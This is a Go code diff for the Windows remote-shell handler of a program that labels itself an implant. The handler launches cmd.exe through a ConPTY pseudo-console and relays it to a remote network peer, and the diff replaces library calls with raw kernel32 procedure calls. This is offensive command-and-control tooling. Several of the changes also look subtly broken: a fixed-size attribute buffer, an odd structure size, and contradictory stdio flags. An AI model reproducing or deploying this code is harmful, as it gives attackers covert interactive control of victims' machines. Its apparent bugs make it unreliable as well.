@@ -12,6 +12,22 @@ import (
 	"golang.org/x/sys/windows"
 )
 
+var (
+	modKernel32                        = windows.NewLazySystemDLL("kernel32.dll")
+	procCreatePseudoConsole            = modKernel32.NewProc("CreatePseudoConsole")
+	procClosePseudoConsole             = modKernel32.NewProc("ClosePseudoConsole")
+	procInitializeProcThreadAttributeList = modKernel32.NewProc("InitializeProcThreadAttributeList")
+	procUpdateProcThreadAttribute      = modKernel32.NewProc("UpdateProcThreadAttribute")
+)
+
+type coord struct {
+	X, Y int16
+}
+
+func (c coord) pack() uintptr {
+	return uintptr((int32(c.Y) << 16) | int32(c.X))
+}
+
 type pipeHandle struct {
 	h windows.Handle
 }
@@ -49,6 +65,13 @@ func (a *Agent) handleShellStream(s network.Stream) {
 		rows = 30
 		cols = 120
 	}
+	co := coord{X: int16(cols), Y: int16(rows)}
+	log.Printf("[implant] shell using rows=%d cols=%d", rows, cols)
+
+	if err := procCreatePseudoConsole.Find(); err != nil {
+		log.Printf("[implant] ConPTY not available: %v", err)
+		return
+	}
 
 	var hPtyIn, hCmdIn windows.Handle
 	var hCmdOut, hPtyOut windows.Handle
@@ -63,33 +86,48 @@ func (a *Agent) handleShellStream(s network.Stream) {
 	}
 
 	var hPC windows.Handle
-	if err := windows.CreatePseudoConsole(
-		windows.Coord{X: int16(cols), Y: int16(rows)},
-		hPtyIn, hPtyOut, 0, &hPC,
-	); err != nil {
-		log.Printf("[implant] create pty: %v", err)
+	ret, _, _ := procCreatePseudoConsole.Call(
+		co.pack(),
+		uintptr(hPtyIn),
+		uintptr(hPtyOut),
+		0,
+		uintptr(unsafe.Pointer(&hPC)),
+	)
+	if ret != 0 {
+		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
+		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
+		log.Printf("[implant] create pty failed: ret=0x%x", ret)
+		return
+	}
+	log.Printf("[implant] ConPTY created, hPC=0x%x", uintptr(hPC))
+
+	var attrList [1024]byte
+	var sz uintptr
+	procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&sz)))
+	ret, _, _ = procInitializeProcThreadAttributeList.Call(
+		uintptr(unsafe.Pointer(&attrList[0])),
+		1, 0,
+		uintptr(unsafe.Pointer(&sz)),
+	)
+	if ret == 0 {
+		log.Printf("[implant] init attr list failed")
+		procClosePseudoConsole.Call(uintptr(hPC))
 		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
 		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
 		return
 	}
 
-	attrList, err := windows.NewProcThreadAttributeList(1)
-	if err != nil {
-		log.Printf("[implant] attr list: %v", err)
-		windows.ClosePseudoConsole(hPC)
-		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
-		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
-		return
-	}
-	defer attrList.Delete()
-
-	if err := attrList.Update(
-		windows.PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
-		unsafe.Pointer(&hPC),
+	ret, _, _ = procUpdateProcThreadAttribute.Call(
+		uintptr(unsafe.Pointer(&attrList[0])),
+		0,
+		0x00020016,
+		uintptr(hPC),
 		unsafe.Sizeof(hPC),
-	); err != nil {
-		log.Printf("[implant] update attr: %v", err)
-		windows.ClosePseudoConsole(hPC)
+		0, 0,
+	)
+	if ret == 0 {
+		log.Printf("[implant] update attr failed")
+		procClosePseudoConsole.Call(uintptr(hPC))
 		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
 		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
 		return
@@ -97,16 +135,16 @@ func (a *Agent) handleShellStream(s network.Stream) {
 
 	cmdW, err := windows.UTF16PtrFromString("cmd.exe")
 	if err != nil {
-		windows.ClosePseudoConsole(hPC)
+		procClosePseudoConsole.Call(uintptr(hPC))
 		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
 		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
 		return
 	}
 
 	si := windows.StartupInfoEx{}
-	si.StartupInfo.Cb = uint32(unsafe.Sizeof(windows.StartupInfoEx{}))
-	// ConPTY handles the stdio — no STARTF_USESTDHANDLES needed
-	si.ProcThreadAttributeList = attrList.List()
+	si.StartupInfo.Cb = uint32(unsafe.Sizeof(windows.StartupInfo{}) + unsafe.Sizeof(&attrList[0]))
+	si.StartupInfo.Flags = windows.STARTF_USESTDHANDLES
+	si.ProcThreadAttributeList = (*windows.ProcThreadAttributeList)(unsafe.Pointer(&attrList[0]))
 
 	pi := new(windows.ProcessInformation)
 	err = windows.CreateProcess(
@@ -120,7 +158,7 @@ func (a *Agent) handleShellStream(s network.Stream) {
 	)
 	if err != nil {
 		log.Printf("[implant] create process: %v", err)
-		windows.ClosePseudoConsole(hPC)
+		procClosePseudoConsole.Call(uintptr(hPC))
 		windows.CloseHandle(hPtyIn); windows.CloseHandle(hCmdIn)
 		windows.CloseHandle(hCmdOut); windows.CloseHandle(hPtyOut)
 		return
@@ -129,7 +167,6 @@ func (a *Agent) handleShellStream(s network.Stream) {
 	windows.CloseHandle(pi.Thread)
 	log.Printf("[implant] shell started via ConPTY for %s", remotePeer.String())
 
-	// hPtyIn and hPtyOut are owned by the ConPTY — do NOT close them until ClosePseudoConsole
 	inPipe := &pipeHandle{h: hCmdIn}
 	outPipe := &pipeHandle{h: hCmdOut}
 
@@ -138,7 +175,7 @@ func (a *Agent) handleShellStream(s network.Stream) {
 	go func() {
 		io.Copy(inPipe, s)
 		inPipe.Close()
-		windows.ClosePseudoConsole(hPC)
+		procClosePseudoConsole.Call(uintptr(hPC))
 		done <- struct{}{}
 	}()
 
@@ -149,7 +186,7 @@ func (a *Agent) handleShellStream(s network.Stream) {
 	}()
 
 	<-done
-	windows.ClosePseudoConsole(hPC)
+	procClosePseudoConsole.Call(uintptr(hPC))
 	s.Close()
 
 	<-done
